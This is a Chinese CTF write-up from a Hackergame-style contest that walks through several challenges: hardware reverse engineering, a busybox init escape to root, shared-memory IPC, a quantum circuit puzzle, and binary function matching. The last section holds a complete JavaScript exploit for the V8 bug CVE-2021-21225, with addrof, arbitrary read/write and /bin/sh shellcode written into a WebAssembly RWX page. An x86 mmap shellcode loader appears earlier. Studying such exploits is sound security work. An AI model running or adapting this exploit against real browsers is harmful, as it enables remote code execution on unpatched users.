836102e1565b9250826103e5576103e4610390565b5b828204905092915050565b60006103fb826102e1565b9150610406836102e1565b9250828202610414816102e1565b915080821461042657610425610289565b5b5092915050565b6000610438826102e1565b915063ffffffff820361044e5761044d610289565b5b60018201905091905056fea26469706673582212204b5ca3dd9f45d4b34db8ab03eb265c257fe8dda1c9fe2c3da76b2058249edaf264736f6c63430008110033
```
</details>

## 片上系统

实际上这题是我签到后第一个做的题。当时10月23日零点被 CSL 喊来玩 Hackergame，看到这道题还没人做出来就冲了。结果有人凌晨两点半拿了一血，我凌晨三点半才做出来。

第一问分析逻辑，我没用逻辑分析仪软件直接头铁用十六进制编辑器打开文件，肉眼观察出每字节低四位依次是 CS/CLK/O/I，一通操作可以得到发送给 SD 卡的指令序列：
```
40 00 00 00 00 95
48 00 00 01 AA 87
77 00 00 00 00 01
69 40 00 00 00 01
77 00 00 00 00 01
69 40 00 00 00 01
77 00 00 00 00 01
69 40 00 00 00 01
51 00 00 00 00 FF
51 00 00 00 01 FF
51 00 00 00 02 FF
51 00 00 00 03 FF
51 00 00 00 04 FF
51 00 00 00 05 FF
51 00 00 00 06 FF
```

就算不去查 SD 卡每条指令的编号也可以看出最后几条指令是在依次读取 0~6 号扇区，遂提取之丢进 RISC-V 反汇编工具。

一通分析后发现输出 `flag{` 部分的代码：

```
     2fc:	200017b7		lui	a5,0x20001
     300:	47978793		addi	a5,a5,1145
        a5 = 0x20001479; // flag{
     304:	06600693		li	a3,102
     308:	00072583		lw	a1,0(a4)
     30c:	fe058ee3		beqz	a1,0x308
     310:	00d62023		sw	a3,0(a2)
     314:	00072683		lw	a3,0(a4)
     318:	fe068ee3		beqz	a3,0x314
     31c:	00178793		addi	a5,a5,1
     320:	fff7c683		lbu	a3,-1(a5)
     324:	fe0692e3		bnez	a3,0x308
     
     328:	20001537		lui	a0,0x20001
     32c:	01850513		addi	a0,a0,24
     330:	ce9ff0ef		jal	ra,0x18 ; <---
        
     334:	20001537		lui	a0,0x20001
     338:	deadc7b7		lui	a5,0xdeadc
     33c:	eef78793		addi	a5,a5,-273
     340:	06c50513		addi	a0,a0,108
     344:	00f54533		xor	a0,a0,a5
     348:	cd1ff0ef		jal	ra,0x18 ; <---
     
     34c:	0e000513		li	a0,224
     350:	cc9ff0ef		jal	ra,0x18 ; <---
     
     354:	4984a683		lw	a3,1176(s1)
     358:	49c42603		lw	a2,1180(s0)
     35c:	200017b7		lui	a5,0x20001
     360:	48178793		addi	a5,a5,1153
     364:	07d00713		li	a4,125
     368:	0006a583		lw	a1,0(a3)
     36c:	fe058ee3		beqz	a1,0x368
     370:	00e62023		sw	a4,0(a2)
     374:	0006a703		lw	a4,0(a3)
     378:	fe070ee3		beqz	a4,0x374
     37c:	00178793		addi	a5,a5,1
     380:	fff7c703		lbu	a4,-1(a5)
     384:	fe0712e3		bnez	a4,0x368
     388:	0000006f		j	0x388
```

进一步分析发现 `jal ra,0x18` 调用到的函数是以十六进制输出 a0 寄存器，一共调用了三次。那就好办了，把代码用 C++ 写一遍执行就是 Flag 了。（其实手算也行，懒了。）

<details>
<summary>C++ 代码</summary>

```c++
#include <cstdint>

#include <iostream>

void printHex(std::uint32_t x) {
    for(int i = 28; i >= 0; i -= 4)
        std::putchar("0123456789abcdef"[(x >> i) & 0xF]);
}

int main() {
    std::printf("flag{");
    
    {
        std::uint32_t a0 = 0x20001018;
        printHex(a0);
    }
    
    {
        std::uint32_t a0 = 0x20001000 + 108;
        std::uint32_t a5 = 0xDEADC000 - 273;
        a0 ^= a5;
        printHex(a0);
    }
    
    {
        std::uint32_t a0 = 224;
        printHex(a0);
    }
    
    std::printf("}\n");
}
```
</details>


## 传达不到的文件

看到环境里有 busybox 于是试着 `rm /bin/busybox` 发现竟然能删掉，然后乱按到 `Ctrl+D` 时出现了奇怪的报错：
```
/etc/init.d/rcS: line 24: umount: not found
/etc/init.d/rcS: line 25: umount: not found
/etc/init.d/rcS: line 28: poweroff: not found
can't run '/bin/sh': No such file or directory
can't run '/bin/sh': No such file or directory
can't run '/bin/sh': No such file or directory
can't run '/bin/sh': No such file or directory
can't run '/bin/sh': No such file or directory
# ...
```
于是非预期解 Get：输个 `rm /sbin/poweroff; exit` 就因为没法 poweroff 直接进到 root 了，接下来直接 `cat /chall`、`cat /flag2` 就能看到 Flag。

## 看不见的彼方

Socket 禁用了那进程间通信的手段还多着呢，我用的是共享内存 `shmXXX`。想不出来属于是操作系统实验课没好好做了。

<details>
<summary>C 代码</summary>

Alice:
```c
#include <stdio.h>
#include <string.h>
#include <sys/shm.h>

int main() {
    int shm = shmget(123, 4096, IPC_CREAT | 0666);
    char* buffer = shmat(shm, NULL, 0);
    memset(buffer, 0, 4096);
    
    FILE* file = fopen("/secret", "rb");
    fread(buffer, 1, 4096, file);
}
```

Bob:
```c
#include <stdio.h>
#include <string.h>
#include <sys/shm.h>
#include <unistd.h>

int main() {
    usleep(500000);
    
    int shm = shmget(123, 4096, 0666);
    fprintf(stderr, "%d\n", shm);
    if(shm < 0) return 1;
    char* buffer = shmat(shm, NULL, 0);
    fprintf(stderr, "%p\n", buffer);
    if(buffer == (char*)-1) return 1;
    fprintf(stderr, "%d\n", (int)strlen(buffer));
    fwrite(buffer, 1, strlen(buffer), stdout);
}
```

</details>

## 量子藏宝图

第一幕的“截取前 128 比特”太有误导性了，怎么试都不对，最后发现是要把所有匹配的位都输入才行。

第二幕的量子电路图之前有所了解，于是干脆自己写了个小的模拟器来求解。就是抄数据有点脑壳疼，过程中还抄错了几位。

<details>
<summary>Python 代码</summary>

```py
'''
0: (1, 0) |0>
1: (0, 1) |1>
2: (-1, 0)
3: (0, -1)
4: (1, 1) |+>
5: (1, -1) |->
6: (-1, 1)
7: (-1, -1)
'''

state = [0 for _ in range(129)]

def X(x):
    state[x] = [1, 0, 3, 2, 4, 6, 5, 7][state[x]]

def Z(x):
    state[x] = [0, 3, 2, 1, 5, 4, 7, 6][state[x]]

def H(x):
    state[x] = [4, 5, 7, 6, 0, 1, 3, 2][state[x]]

# 剩下的映射懒得算了，不过好像计算过程中没用到就不管了吧
def CNOT(x, y):
    s = [
        [(0, 0), (0, 1), (), (), (), (), (), ()],
        [(1, 1), (1, 0), (), (), (), (), (), ()],
        [(), (), (), (), (), (), (), ()],
        [(), (), (), (), (), (), (), ()],
        [(), (), (), (), (4, 4), (5, 5), (), ()],
        [(), (), (), (), (5, 4), (4, 5), (), ()],
        [(), (), (), (), (), (), (), ()],
        [(), (), (), (), (), (), (), ()],
    ][state[x]][state[y]]
    state[x], state[y] = s

# 下面由于是自动生成的所以每个人的数据都可能不一样哦
X(128)
for i in range(129): H(i)
for i in [37, 48, 52, 54, 64, 75, 94, 98, 123, 126]: X(i)
for i in [13, 61, 67, 73, 121]: Z(i)
CNOT(0, 128)
for i in [54, 64, 75, 123]: X(i)
for i in [67, 73, 121]: Z(i)
for i in [
    2, 3, 4, 5, 6, 8, 9, 13, 14, 16, 17, 21, 22, 24, 25, 26,
    28, 29, 33, 36, 37, 42, 45, 46, 48, 51, 52, 53, 56, 61, 62, 66,
    68, 69, 72, 74, 76, 77, 80, 84, 85, 88, 89, 91, 92, 93, 94, 96,
    97, 98, 101, 102, 104, 109, 110, 114, 115, 117, 118, 121, 122, 125, 126,
    ]: CNOT(i, 128)
for i in [37, 48, 52, 94, 98, 126]: X(i)
for i in [13, 61]: Z(i)
for i in range(128): H(i)

print(state)

data = [0 for _ in range(16)]
for i in range(16):
    x = 0
    for j in range(8):
        if state[8 * i + j] >= 4:
            x = None
            break
        x |= [0, 1, 0, 1][state[8 * i + j]] << j
    if x is None: x = '<Error>'
    else: x = chr(x)
    data[i] = x
data.reverse()
print(data)
print(''.join(data))
```

</details>

## 《关于 RoboGame 的轮子永远调不准速度这件事》

8051 汇编以前也玩过，于是首先把 ROM 给 dump 下来然后随便找个 8051 反汇编器和源码对照了一下看看。最后发现是把 `rand` 里 `& 7` 直接清零成 `& 0` 就能直接让随机函数返回固定值了。剩下的都很轻松。

<details>
<summary>C++代码</summary>

```c++
#include <cstdio>

int main() {
    std::printf("w T 65 02");
    for(int i = 0; i < 64; ++i)
        std::printf(" %02X", i == 0x3D ? 0x07 : 0x00);
    std::putchar('\n');
    std::printf("w 1 1 17\n");
    std::printf("w 4 1 17\n");
    std::printf("w 7 1 17\n");
    std::printf("w 9 1 17\n");
    for(int i = 0; i < 0x24; ++i)
        std::printf("r %c 1\n", '0' + i);
}
```
</details>

## 壹...壹字节？

代码看了半天，发现 `mmap` 给了个 `MAP_SHARED` 参数很可疑，就想有没有可能 `mmap` 会保留文件结尾后的垃圾数据。后面的测试也证明了这个想法，于是只要将文件大小 `ftruncate` 为 1 并 `mmap` 写入全部的 Shellcode，最后让这个程序活到 shell 被 kill 之后就能执行这段超过一字节 Shellcode 了。为了减小代码体积就全部用汇编写了，然后通过 `echo -e -n "\xXX\xXX\xXX\xXX" >> hack` 来上传。

<details>
<summary>汇编代码</summary>

```nasm
    section .data

readyMessage: db "Ready!", 10
readyMessageLength: equ $ - readyMessage

fileName: db "/shellcode", 0

shellCode:
    mov rax, [rsp]
    sub rax, 0x178c ; next rip
    push rbx
    push rdi
    ; cat flag
    mov rbx, 0x0000000000000000
    push rbx
    mov rbx, 0x67616C6620746163
    push rbx
    mov rdi, rsp
    lea rbx, [rax + 0x12d0] ; system
    call rbx
    pop rdi
    pop rbx
    ret
shellCodeLength: equ $ - shellCode

fd: dq 0
mmapAddress: dq 0

    section .text

    global _start
_start:
    mov eax, 5 ; sys_open
    mov rbx, fileName
    mov ecx, 0x00000042 ; O_RDWR | O_CREAT
    mov edx, 0o777
    int 0x80
    mov [fd], rax
    
    mov eax, 93 ; sys_ftruncate
    mov rbx, [fd]
    mov rcx, 1
    int 0x80
    
    mov eax, 9 ; sys_mmap
    mov rdi, 0
    mov rsi, 0x1000
    mov rdx, 0x00000007 ; PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10, 0x00000001 ; MAP_SHARED
    mov r8, [fd]
    mov r9, 0
    syscall ; 别问我为什么前面都是 int 0x80 这里突然改成 syscall 了
    mov [mmapAddress], rax
    
    mov rsi, shellCode
    mov rdi, [mmapAddress]
    mov rcx, shellCodeLength
    rep movsb
    
    mov eax, 4 ; sys_write
    mov ebx, 1
    mov rcx, readyMessage
    mov rdx, readyMessageLength
    int 0x80
    
    jmp $
    
    mov eax, 1 ; sys_exit
    mov ebx, 0
    int 0x80
```
</details>

<details>
<summary>Makefile</summary>

```makefile
Hack.o: Hack.asm
	nasm -f elf64 Hack.asm -o Hack.o

Hack: Hack.o
	gcc -nostartfiles -nostdlib -nodefaultlibs Hack.o -o Hack
	strip -s Hack
```
</details>

<details>
<summary>Python 代码</summary>

```py
with open('Hack', 'rb') as file:
    code = file.read()

for i in range(0, len(code), 32):
    payload = ''
    for c in code[i : i + 32]:
        payload += f'\\x{c:02X}'
    print(f'echo -e -n "{payload}" >> hack')
print('/busybox chmod +x hack')
print('./hack &')
```
</details>

## 企鹅拼盘

**PARTIAL UNSOLVE**

前两位直接暴力遍历所有输入就能过了。第三问一直没什么想法，也就顶多想到每种操作是个 $A_{15}$ 交错群了，第二问给的 Flag 里的 `NC1` 还以为是 Nice 的缩写，也就没有深究。

## 小 Z 的靓号钱包

**UNSOLVE**

知识盲区 +1。

## 火眼金睛的小 E

**PARTIAL UNSOLVE**

第一问直接 objdump -d 然后用文本搜索的方式肉眼找出看起来比较像的函数，轻轻松松。

第二问应该是非预期解了：直接按 endbr64 划分函数（如果发现输入不是 endbr64 就直接放弃这组数据，这种情况意外的少），然后将函数直接当字节序列比较，随便凑了一个奇怪的公式（大致上是最长公共子序列 / 序列长度差异，详见代码）竟然能到接近 60% 的正确率？！

当然第三问用前面的瞎搞做法正确率就只有 10% 不到了，我投降。

<details>
<summary>Python 代码</summary>

```py
from pwn import *

ENDBR64 = b'\xf3\x0f\x1e\xfa'

def readFile(path):
    with open(path, 'rb') as file:
        return file.read()

def writeFile(path, data):
    with open(path, 'wb') as file:
        file.write(data)

def findENDBR64(data, p):
    while p + 4 <= len(data):
        if data[p : p + 4] == ENDBR64: return p
        p += 1
    return len(data)

def LCS(a, b):
    la, lb = len(a), len(b)
    p = [0 for _ in range(lb + 1)]
    q = [0 for _ in range(lb + 1)]
    for i in range(la):
        for j in range(lb):
            if a[i] == b[j]:
                q[j + 1] = p[j] + 1
            else:
                q[j + 1] = max(q[j], p[j + 1])
        p, q = q, p
    return p[lb]

def compare(pathA, pathB, addr):
    try:
        with ELF(pathA) as a:
            textA = a.get_section_by_name('.text')
            offsetA, sizeA = textA.header.sh_offset, textA.header.sh_size
            dataA = a.read(offsetA, sizeA)
            assert(dataA[addr - offsetA : addr - offsetA + 4] == ENDBR64)
            funcA = dataA[addr - offsetA : findENDBR64(dataA, addr - offsetA + 4)]
        
        with ELF(pathB) as b:
            textB = b.get_section_by_name('.text')
            offsetB, sizeB = textB.header.sh_offset, textB.header.sh_size
            dataB = b.read(offsetB, sizeB)
            funcsB = []
            p = findENDBR64(dataB, 0)
            while p < len(dataB):
                q = findENDBR64(dataB, p + 4)
                funcsB.append((offsetB + p, dataB[p : q]))
                p = q
            result, maxScore = 0, 0
            for addrB, funcB in funcsB:
                if abs(len(funcB) - len(funcA)) > 1000: continue
                lcs = LCS(funcA, funcB)
                score = (lcs / len(funcA)) / (abs(len(funcB) - len(funcA)) / len(funcA) + 0.1)
                if score > maxScore:
                    result = addrB
                    maxScore = score
        
        return result
    except:
        return 0

if __name__ == '__main__':
    for i in range(100):
        result = compare(f'data/A{i}.bin', f'data/B{i}.bin', int(readFile(f'data/Addr{i}.txt'), 16))
        print(f'-> {result:04x}')
        writeFile(f'data/Result{i}.txt', f'{result:04x}'.encode())
```
</details>

## evilCallback

第一次玩这种题目，奋斗了3天最后到10月29日早上八点多（离比赛结束只有三个多小时）才搞定。

最开始 在搜索 `HasSimpleElements` 关键字搜到了[这篇微信公众号文章](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458468074&idx=2&sn=06eb27c1649bd4e3a3e43a46a9500add)，顺藤摸瓜发现了 https://tiszka.com/blog/CVE_2021_21225.html 和 https://tiszka.com/blog/CVE_2021_21225_exploit.html<!---->，里面竟然直接给了完整的 exp！然而试了一下会发现因为出题人把 v8 的指针压缩给关了，导致偏移量都得自己重新找，增加了一些难度，只能学着用 GDB 一个一个找。调了很久把任意内存读写调通之后，发现这里面最后一步的 RWX 内存页怎么都没法获取，首先 `write_protect_code_memory` 的地址没法稳定获取，而且就算尝试硬编码地址，写入它会让 v8 因为奇怪的报错而崩溃。直到最后一天的早晨一觉醒来突然想搜搜看有没有别的获取 RWX 内存页的方法时，找到了这个：https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_30632/<!---->。原来 WebAssembly 的 JIT 的内存页就直接是 RWX 的！于是把这最后一块拼图拼上，成功获取 Shell！

<details>
<summary>JavaScript 代码</summary>

```js
// 这段 WebAssembly 代码只是让 v8 生成 RWX 的内存页用的，实际的 Shellcode 在最下面
let code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
    127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128,
    128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101,
    109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128,
    128, 128, 0, 0, 65, 42, 11]);
let module = new WebAssembly.Module(code);
let instance = new WebAssembly.Instance(module);
let main = instance.exports.main;

class Helpers {
    constructor() {
        this.addrof_LO = new Array(1048577);

        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.state = {};

        this.addrof_LO[0] = {};
    }
    
    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }
    
    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }
    
    itof(i) {
        this.u32[0] = i;
        return this.f32[0];
    }
    
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }
    
    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    
    clean() {
        this.state.fake_object.fill(0);
    }
    
    printhex(val) {
        console.log('0x' + val.toString(16));
    }
    
    add_ref(object) {
        this.state[this.i++] = object;
    }
    
    compact() {
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
        new ArrayBuffer(0x7fe00000);
    }
}

function pwn() {
    let helper = new Helpers();
    let corrupted_array;
    
    function information_leak() {
        class LeakTypedArray extends Float64Array {}
        let lta = new LeakTypedArray(1024);
        
        // This is required to avoid an exception being thrown
        // here: 
        lta.__defineSetter__('length', function() {})
        
        // Create a Literal JSArray
        let a = [
            /* hole */
            , 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9 // HOLEY_DOUBLE_ELEMENTS
        ];
        
        // We'll be using this in create_fake_object
        let fake_object = [1.1, 2.2, 3.3, 4.4];
        
        // We'll be using this for our addrOf primitive
        let addrof_array = [{}, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];
        
        const C = new Function();
        C.__defineGetter__(Symbol.species, () => {
            return function() {
                return lta;
            }
        });
        a.constructor = C;
        
        Array.prototype[0] = {
            valueOf: function() {
                a.length = 1;
                new ArrayBuffer(0x7fe00000); // Trigger a mark-sweep GC
                delete Array.prototype[0];
            }
        };
        
        let c = Array.prototype.concat.call(a);
        
        helper.state.map = helper.f64toi64(lta[1]);
        helper.state.properties = helper.f64toi64(lta[2]);
        helper.state.elements = helper.f64toi64(lta[3]);
        helper.state.length = helper.f64toi64(lta[4]);
        
        helper.state.fake_object = fake_object;
        helper.state.addrof_array = addrof_array;
        
        helper.state.fake_object_bytearray_address = helper.state.elements + 0x48n;
        helper.state.addrof_array_addr = helper.state.elements + 0x88n;
        
        helper.add_ref(a);
    }
    
    function create_fake_object() {
        class LeakTypedArray extends Float64Array {}
        let lta = new LeakTypedArray(1024);
        lta.__defineSetter__('length', function() {})
        
        // 7
        let a = [
            1.1, 2.2, 3.3, 4.4, 5.5, /* hole */, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, {} // HOLEY_ELEMENTS
        ];
        
        /*
            Create a a Float32Array that will store the pointer 
            of our Fake `JSArray` one index behind /\* hole *\/
            after `a` is shortened by the `valueOf` callback     
        */
        let fake_jsarray_object_ptr = [helper.i64tof64(helper.state.fake_object_bytearray_address), 1.1, 2.2];
        
        const C = new Function();
        C.__defineGetter__(Symbol.species, () => {
            return function() {
                return lta;
            }
        });
        a.constructor = C;
        
        helper.state.fake_object[0] = helper.i64tof64(helper.state.map);
        helper.state.fake_object[1] = helper.i64tof64(helper.state.properties);
        helper.state.fake_object[2] = helper.i64tof64(helper.state.elements);
        helper.state.fake_object[3] = helper.i64tof64(helper.state.length);
        
        Array.prototype[5] = {
            valueOf: function() {
                a.length = 1;
                new ArrayBuffer(0x7fe00000);
                
                Object.prototype.valueOf = function() {
                    corrupted_array = this; // grab our fake `JSArray`
                    delete Object.prototype.valueOf; // clean up this valueOf
                    throw 'bailout'; // throw to escape Object::ToNumber
                }
                
                delete Array.prototype[5];
                return 1.1;
            }
        };
        
        let c = Array.prototype.concat.call(a);
    }
    
    function addrOf(object) {
        helper.state.fake_object[2] = helper.i64tof64(helper.state.addrof_array_addr);
        helper.state.addrof_array[0] = object;
        return helper.f64toi64(corrupted_array[0]);
    }
    
    function arbRead(where) {
        helper.state.fake_object[2] = helper.i64tof64(where - 16n);
        return helper.f64toi64(corrupted_array[0]);
    }
    
    function arbWrite(where, what) {
        helper.state.fake_object[2] = helper.i64tof64(where - 16n);
        corrupted_array[0] = helper.i64tof64(what);
    }
    
    information_leak();
    try {
        create_fake_object();
    } catch (e) {}
    
    let instanceAddr = addrOf(instance);
    console.log(instanceAddr.toString(16));
    
    let assemblyOffset = arbRead(instanceAddr + 0x80n) + 0x420n + 1n;
    console.log(assemblyOffset.toString(16));
    
    let shellcode = [0x6E69622FB848686An, 0xE7894850732F2F2Fn, 0x2434810101697268n, 0x6A56F63101010101n, 0x894856E601485E08n, 0x050F583B6AD231E6n];
    for (let i = 0; i < shellcode.length; i++) {
        console.log(i);
        arbWrite(assemblyOffset + BigInt(8 * i), shellcode[i]);
    }
    
    main();
}

pwn();
```
</details>
